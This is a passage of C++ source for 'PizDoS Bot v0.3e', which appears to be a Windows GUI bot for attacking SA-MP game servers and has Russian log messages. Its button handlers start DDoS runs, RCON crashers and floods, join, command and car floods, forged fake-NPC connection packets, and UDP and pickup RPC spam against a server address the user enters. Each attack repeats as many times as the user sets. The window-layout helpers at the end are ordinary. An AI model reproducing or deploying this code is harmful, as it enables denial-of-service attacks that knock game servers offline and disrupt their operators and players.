		settings.test231556=false;
		Log(" * Samp-Rp DDoS выключен.");
		}}
		break;

		case CLICKED(147):
		{
		if(!settings.test231){
		Log(" * Fake Join включен.");
		settings.test231=true;
		}else{
		settings.test231=false;
		Log(" * Fake Join выключен.");
		}}
		break;

		case CLICKED(155):
		{
		if(!settings.test2312){
		Log(" * Rcon Crasher включен.");
		settings.test2312=true;
		}else{
		settings.test2312=false;
		Log(" * Rcon Crasher выключен.");
		}}
		break;

		case CLICKED(150):
		{
		if(!settings.test2311){
		Log(" * Join Flood включен.");
		settings.test2311=true;
		}else{
		settings.test2311=false;
		Log(" * Join Flood выключен.");
		}}
		break;

		case CLICKED(152):
		{
		if(!settings.test23112){
		Log(" * Join|&|Reg включен.");
		settings.test23112=true;
		}else{
		settings.test23112=false;
		Log(" * Join|&|Reg выключен.");
		}}
		break;

		case CLICKED(151):
		{
		if(!settings.test23111){
		Log(" * Join|&|Exit включен.");
		settings.test23111=true;
		}else{
		settings.test23111=false;
		Log(" * Join|&|Exit выключен.");
		}}
		break;

		case CLICKED(146):
		{
		if(!settings.test233){
		Log(" * Fake Kill Fix включен.");
		settings.test233=true;
		}else{
		settings.test233=false;
		Log(" * Fake Kill Fix выключен.");
		}}
		break;

		case CLICKED(143):
		{
		if(!settings.test12){
		Log(" *  +100 Online DoS включен.");
		settings.test12=true;
		}else{
		settings.test12=false;
		Log(" *  +100 Online DoS выключен.");
		}}
		break;

		case CLICKED(144):
		{
		if(!settings.test122){
		Log(" * DoS включен.");
		settings.test122=true;
		}else{
		settings.test122=false;
		Log(" * DoS выключен.");
		}}
		break;

		case CLICKED(145):
		{
		if(!settings.test133){
		Log(" * Nagibator включен.");
		settings.test133=true;
		}else{
		settings.test133=false;
		Log(" * Nagibator выключен.");
		}}
		break;

		case CLICKED(142):
		{
		if(!settings.test21){
		Log(" * Mega-Dialogos :D включен.");
		settings.test21=true;
		}else{
		settings.test21=false;
		Log(" * Mega-Dialogos :( выключен.");
		}}
		break;

		case CLICKED(115):
		{
		if(!settings.fakeKill){
		Log(" * Fake Kill включен.");
		settings.fakeKill=true;
		}else{
		settings.fakeKill=false;
		Log(" * Fake Kill выключен.");
		}}
		break;

		case CLICKED(228):
		{
		if(!settings.fakeKilll){
		Log(" * Motherfucker включен.");
		settings.fakeKilll=true;
		}else{
		settings.fakeKilll=false;
		Log(" * Motherfucker выключен.");
		}}
		break;

		case CLICKED(116):
		{
		int iPlayerCount = 0;
		Log(" ");
		Log("=== PLAYER LIST ===");
		Log("ID Name Ping Score");
		for(int i = 0; i < MAX_PLAYERS; i++)
		{
			if(!playerInfo[i].iIsConnected)
				continue;

			Log("(%d) %s %d %d", i, playerInfo[i].szPlayerName, playerInfo[i].dwPing, playerInfo[i].iScore);
			iPlayerCount++;
		}
		Log(" ");
		Log("=== [COUNT: %d] ===", iPlayerCount);
		Log(" ");
		}
		break;

		case CLICKED(117):
		{
       RakNet::BitStream bsSpawnRequest;
       bsSpawnRequest.Write(rand()%7);
       pRakClient->RPC(&RPC_RequestClass, &bsSpawnRequest, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	    }
		break;

		case CLICKED(118):
		{
		if(!settings.lag){
		Log(" * Car flood включен.");
		settings.lag=true;
		}else{
		settings.lag=false;
		Log(" * Car flood выключен.");
		}}
		break;

		case CLICKED(119):
		{
		if(GetWindowTextLength(rdpe) == 0 || GetWindowTextLength(rdpr) == 0)
		break;
		char amou2[12];
		char str2[512];
		SendMessage(rdpe, WM_GETTEXT, (WPARAM)512, (LPARAM)str2);
		SendMessage(rdpr, WM_GETTEXT, (WPARAM)11, (LPARAM)amou2);
		Log("* Заданное кол-во Rcon Exploitov [%s] успешно запущено.",amou2);
		int i = atoi(amou2);
		for (int a = 0; a < i; a++)
		{
        rconWarnings();
		}
		SetFocus(rdpe);
		}
		break;

		case CLICKED(131):
		{
		if(GetWindowTextLength(aaa) == 0 || GetWindowTextLength(aaaa) == 0)
		break;
		char amou2[12];
		char str2[512];
		SendMessage(aaa, WM_GETTEXT, (WPARAM)512, (LPARAM)str2);
		SendMessage(aaaa, WM_GETTEXT, (WPARAM)11, (LPARAM)amou2);
		Log("* Заданное кол-во CMD Flood [%s] успешно запущено.",amou2);
		int i = atoi(amou2);
		for (int a = 0; a < i; a++)
		{
		tests();
		}
		SetFocus(aaa);
		}
		break;

		case CLICKED(133):
		{
		if(GetWindowTextLength(bbb) == 0 || GetWindowTextLength(bbbb) == 0)
		break;
		char amou2[12];
		char str2[512];
		SendMessage(bbb, WM_GETTEXT, (WPARAM)512, (LPARAM)str2);
		SendMessage(bbbb, WM_GETTEXT, (WPARAM)11, (LPARAM)amou2);
		Log("* Заданное кол-во Rcon Flood's [%s] успешно запущено.",amou2);
		int i = atoi(amou2);
		for (int a = 0; a < i; a++)
		{
		test1();
		}
		SetFocus(bbb);
		}
		break;

		case CLICKED(137):
		{
		if(GetWindowTextLength(zzz) == 0 || GetWindowTextLength(zzzz) == 0)
		break;
		char amou2[12];
		char str2[512];
		SendMessage(zzz, WM_GETTEXT, (WPARAM)512, (LPARAM)str2);
		SendMessage(zzzz, WM_GETTEXT, (WPARAM)11, (LPARAM)amou2);
		Log("* Заданное кол-во BUGs [%s] успешно запущено.",amou2);
		int i = atoi(amou2);
		for (int a = 0; a < i; a++)
		{
		RespawnCars();
		}
		SetFocus(zzz);
		}
		break;

		case CLICKED(153):
		{
		if(GetWindowTextLength(addbotn) < 3)
		break;
		char str[512];
		SendMessage(addbotn, WM_GETTEXT, (WPARAM)512, (LPARAM)str);
		pRakClient = RakNetworkFactory::GetRakClientInterface();
		char szNewNick[24];
		char *szPassword;
		pRakClient->SetMTUSize(576);
		iGettingNewName = true;
		sprintf(szNewNick, "%s", str);
		Log(" * Бот %s заходит на сервер", szNewNick);
		strcpy(g_szNickName, szNewNick);
		resetPools(1, 0);
		RegisterRPCs(pRakClient);
		iSpawned = 1;
		PLAYERID copyingID = getPlayerIDFromPlayerName(settings.szFollowingPlayerName);
		if(copyingID != (PLAYERID)-1)
		onFootUpdateFollow(copyingID);
		SetFocus(addbotn);
		}
		break;
		

		case CLICKED(128):
		{
		if(GetWindowTextLength(rdpo) == 0 || GetWindowTextLength(rdpp) == 0)
		break;
		char amou2[12];
		char str2[512];
		SendMessage(rdpo, WM_GETTEXT, (WPARAM)512, (LPARAM)str2);
		SendMessage(rdpp, WM_GETTEXT, (WPARAM)11, (LPARAM)amou2);
		Log("* Заданное кол-во Fake NPC [%s] успешно запущено.",amou2);
		int i = atoi(amou2);
		for (int a = 0; a < i; a++)
		{
        char nick[24] = {0};
        gen_random(nick, 4);
        RakNet::BitStream bsSend;
		char auth_bs[4*16] = {0};
        char *pszAuthBullshit = auth_bs;
        int iVersion = NETGAME_VERSION;
        BYTE byteMod = 1;
        BYTE byteNameLen = (BYTE)strlen(nick);
        BYTE byteAuthBSLen = (BYTE)strlen(pszAuthBullshit);
		unsigned int uiChallenge;
        unsigned int uiClientChallengeResponse = uiChallenge ^ iVersion;
        bsSend.Write((int)33563352);
        bsSend.Write(byteMod);
        bsSend.Write(byteNameLen);
        bsSend.Write(nick, byteNameLen);
        bsSend.Write(uiClientChallengeResponse);
        bsSend.Write(byteAuthBSLen);
        bsSend.Write(pszAuthBullshit, byteAuthBSLen);
        int k = 14;
        pRakClient->RPC(&k, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		}
		SetFocus(rdpo);
		}
		break;

		case CLICKED(122):
		{
		if(GetWindowTextLength(rdp1) == 0 || GetWindowTextLength(rdp2) == 0)
		break;
		char amou3[12];
		char str3[512];
		SendMessage(rdp1, WM_GETTEXT, (WPARAM)512, (LPARAM)str3);
		SendMessage(rdp2, WM_GETTEXT, (WPARAM)11, (LPARAM)amou3);
		Log("* Заданное кол-во DDoS атак [%s] успешно запущено.",amou3);
		int i = atoi(amou3);
		for (int a = 0; a < i; a++)
		{
        rconWarnings();
		sampModifiedPackets();
        dialogWarnings();
		}
		SetFocus(rdp1);
		}
		break;

		case CLICKED(135):
		{
		if(GetWindowTextLength(change_ip) < 10)
		break;
		char ip[512];
		SendMessage(change_ip, WM_GETTEXT, (WPARAM)512, (LPARAM)ip);
		Log(" * Переход на %s", ip);
		char *pszAddr = ip;
		iGettingNewName = true;
		int iPort;
		char *pszAddrBak = pszAddr;
        while(*pszAddrBak)
		{
		if(*pszAddrBak == ':')
		{
		*pszAddrBak = 0;
		pszAddrBak++;
		iPort = atoi(pszAddrBak);
		}
		pszAddrBak++;
	    }
        strcpy(settings.server.szAddr, pszAddr);
		settings.server.iPort = iPort;
		resetPools(1, 0);
		} 
		break;
		

		case CLICKED(124):
		{
		if(GetWindowTextLength(rdpt) == 0 || GetWindowTextLength(rdpy) == 0)
		break;
		char amou4[12];
		char str4[512];
		SendMessage(rdpt, WM_GETTEXT, (WPARAM)512, (LPARAM)str4);
		SendMessage(rdpy, WM_GETTEXT, (WPARAM)11, (LPARAM)amou4);
		Log("* Заданное кол-во UDP пакетов [%s] успешно отправляется.",amou4);
		int i = atoi(amou4);
		for (int a = 0; a < i; a++)
		{
       sampModifiedPackets();
		}
		SetFocus(rdpt);
		}
		break;
		

		case CLICKED(126):
		{
		if(GetWindowTextLength(rdpu) == 0 || GetWindowTextLength(rdpi) == 0)
		break;
		char amou5[12];
		char str5[512];
		SendMessage(rdpu, WM_GETTEXT, (WPARAM)512, (LPARAM)str5);
		SendMessage(rdpi, WM_GETTEXT, (WPARAM)11, (LPARAM)amou5);
		Log("* Заданное кол-во Pickup [%s] успешно запущено.",amou5);
		int i = atoi(amou5);
		for (int a = 0; a < i; a++)
		{
		RakNet::BitStream bsPickedUpPickup;
	    pRakClient->Send(&bsPickedUpPickup, HIGH_PRIORITY, RELIABLE, 0);
	    bsPickedUpPickup.Write(bsPickedUpPickup);
		pRakClient->RPC(&RPC_PickedUpPickup, &bsPickedUpPickup, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	    }
		SetFocus(rdpu);
		}
		break;
		}
		

//			AddButton(123,"Invalid Connect");
		if((GetFocus() == inputhwnd) && (0x8000 & GetKeyState(VK_RETURN)))
		{
			// process typed command
			if(GetWindowTextLength(inputhwnd) == 0)
				break;

			char str[512];
			SendMessage(inputhwnd, WM_GETTEXT, (WPARAM)512, (LPARAM)str);
			SendMessage(inputhwnd, WM_SETTEXT, 0, (LPARAM)"");
			RunCommand(str, 0);

			SetFocus(inputhwnd);
		}

		break;

	case WM_DESTROY:
		// We post a WM_QUIT when our window is destroyed so we break the main message loop.
		sampDisconnect(0);
		PostQuitMessage(0);
		break;

	}

	// Not a message we wanted? No problem hand it over to the Default Window Procedure.
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

// Calculates the size used by text to expand a rect
BOOL CalcWindowTextSize(HWND hWnd, LPRECT rcFit) // by Napalm
{
	BOOL bResult = FALSE;
	LPTSTR lpWindowText;
	HDC hdcWindow;
	INT nLen;

	// If the window has no text return true
	nLen = GetWindowTextLength(hWnd);
	if(nLen == 0)	
		return TRUE;

	// Get the HDC for the window
	if(hdcWindow = GetDC(hWnd)){
		// Allocate room for the text
		lpWindowText = new TCHAR[nLen + 1];
		if(lpWindowText){
			// Get the window text
			if(GetWindowText(hWnd, lpWindowText, nLen + 1)){
				// Use the CALCRECT option to determine the size
				//  of the text in the current font selected into the HDC
				DrawText(hdcWindow, lpWindowText, nLen, rcFit,
					DT_LEFT | DT_WORDBREAK | DT_CALCRECT);
				bResult = TRUE;
			}
			delete lpWindowText;
		}
		ReleaseDC(hWnd, hdcWindow);
	}

	return bResult;
}

// Center window in primary monitor or owner/parent.
BOOL CenterWindow(HWND hWnd, HWND hWndCenter = NULL) // by Napalm
{
	RECT rcDlg, rcArea, rcCenter;
	HWND hWndParent;
	DWORD dwStyle, dwStyleCenter;

	// Determine owner window to center against.
	dwStyle = GetWindowLong(hWnd, GWL_STYLE);
	if(!hWndCenter)
		hWndCenter = (dwStyle & WS_CHILD) ? GetParent(hWnd) : GetWindow(hWnd, GW_OWNER);

	// Get coordinates of the window relative to its parent.
	GetWindowRect(hWnd, &rcDlg);
	if(!(dwStyle & WS_CHILD)){
		// Don't center against invisible or minimized windows.
		if(hWndCenter){
			dwStyleCenter = GetWindowLong(hWndCenter, GWL_STYLE);
			if(!(dwStyleCenter & WS_VISIBLE) || (dwStyleCenter & WS_MINIMIZE))
				hWndCenter = NULL;
		}
		// Center within screen coordinates.
		SystemParametersInfo(SPI_GETWORKAREA, NULL, &rcArea, NULL);
		if(hWndCenter) GetWindowRect(hWndCenter, &rcCenter);
		else rcCenter = rcArea;
	}else{
		// Center within parent client coordinates.
		hWndParent = GetParent(hWnd);
		GetClientRect(hWndParent, &rcArea);
		GetClientRect(hWndCenter, &rcCenter);
		MapWindowPoints(hWndCenter, hWndParent, (LPPOINT)&rcCenter, 2);
	}

	int DlgWidth  = rcDlg.right  - rcDlg.left;
	int DlgHeight = rcDlg.bottom - rcDlg.top;

	// Find dialog's upper left based on rcCenter.
	int xLeft = (rcCenter.left + rcCenter.right)  / 2 - DlgWidth  / 2;
	int yTop  = (rcCenter.top  + rcCenter.bottom) / 2 - DlgHeight / 2;

	// If the dialog is outside the screen, move it inside.
	if(xLeft < rcArea.left) xLeft = rcArea.left;
	else if(xLeft + DlgWidth > rcArea.right) xLeft = rcArea.right - DlgWidth;
	if(yTop < rcArea.top) yTop = rcArea.top;
	else if(yTop + DlgHeight > rcArea.bottom) yTop = rcArea.bottom - DlgHeight;

	// Map screen coordinates to child coordinates.
	return SetWindowPos(hWnd, NULL, xLeft, yTop, 0, 0,
		SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
}

DWORD WINAPI windowThread(PVOID)
{
	WNDCLASSEX wcex;
	HDC hdcScreen;
	MSG msg;

	// Link in comctl32.dll
	InitCommonControls();

	ZeroMemory(&msg,  sizeof(MSG));
	ZeroMemory(&wcex, sizeof(WNDCLASSEX));

	// Register our Main Window class.
	wcex.cbSize        = sizeof(WNDCLASSEX);
	wcex.hInstance     = g_hInst;
	wcex.lpszClassName = TEXT("System");
	wcex.lpfnWndProc   = MainWindowProc;
	wcex.hCursor       = LoadCursor(NULL, IDC_ARROW);
	wcex.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
	wcex.hIconSm       = wcex.hIcon;
	wcex.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 9);
	if(!RegisterClassEx(&wcex))
		return 0;

	// Create a font we can later use on our controls. We use MulDiv and GetDeviceCaps to convert
	// our point size to match the users DPI setting.
	hdcScreen = GetDC(HWND_DESKTOP);
	g_hfText = CreateFont(-MulDiv(11, GetDeviceCaps(hdcScreen, LOGPIXELSY), 72), // 11pt
		0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_TT_PRECIS,
		CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, TEXT("System"));
	ReleaseDC(HWND_DESKTOP, hdcScreen);

	// Create an instance of the Main Window.
	hwnd = CreateWindowEx(WS_EX_APPWINDOW, wcex.lpszClassName, TEXT("PizDoS Bot v0.3e"),
		WS_OVERLAPPEDWINDOW | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, CW_USEDEFAULT, CW_USEDEFAULT, 500, 870,
		HWND_DESKTOP, NULL, g_hInst, NULL);

	if(hwnd)
	{
		// Show the main window and enter the message loop.
		ShowWindow(hwnd, 1);
		UpdateWindow(hwnd);
		while(GetMessage(&msg, NULL, 0, 0))
		{
			// If the message was not wanted by the Dialog Manager dispatch it like normal.
			if(!IsDialogMessage(hwnd, &msg)){
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
	}

	// Free up our resources and return.
	DeleteObject(g_hfText);
	ExitProcess(0);

	return 0;
}

void SetUpWindow(HINSTANCE hInstance)
{
	g_hInst = hInstance;
	CreateThread(NULL, 0, windowThread, NULL, 0, NULL);
}

